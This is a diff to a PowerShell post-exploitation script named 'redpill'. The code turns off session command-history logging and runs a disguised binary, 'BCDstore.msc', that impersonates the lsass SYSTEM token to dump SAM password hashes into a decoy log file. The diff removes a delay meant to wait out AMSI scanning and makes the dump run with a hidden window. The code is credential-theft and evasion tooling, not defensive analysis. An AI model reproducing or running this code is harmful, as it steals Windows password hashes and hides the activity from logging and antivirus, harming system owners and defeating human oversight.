@@ -57,7 +57,6 @@
 )
 
 
-$DelayTime = "14" ## Delay in case amsi starts to scan exec!
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -110,11 +109,10 @@ If($GetPasswords -ieq "Enum"){
          ## Execute SAM dump
          # BCDstore.msc will impersonate lsass token (NT AUTHORITY/SYSTEM) to be abble to
          # spawn perfmon.msc (dump hashs) child process with parent process inherit privs.
-         cd $Env:TMP;.\BCDstore.msc -U:T -P:E cmd.exe /R setup.bat
+         cd $Env:TMP;.\BCDstore.msc -U:T -P:E -Wait -ShowWindowMode:Hide cmd.exe /R setup.bat
          cd $Working_Directory ## Return to redpill working directory
 
          ## Read pysecdump logfile { diskmgmt.log }
-         Start-Sleep -Seconds $DelayTime ## Give some time in case amsi starts to scan execution!
          If(-not(Test-Path -Path "$Env:TMP\diskmgmt.log" -EA SilentlyContinue)){
 
             Write-Host "[error] fail to retrieve SAM hashs! (diskmgmt.log)" -ForegroundColor Red -BackgroundColor Black
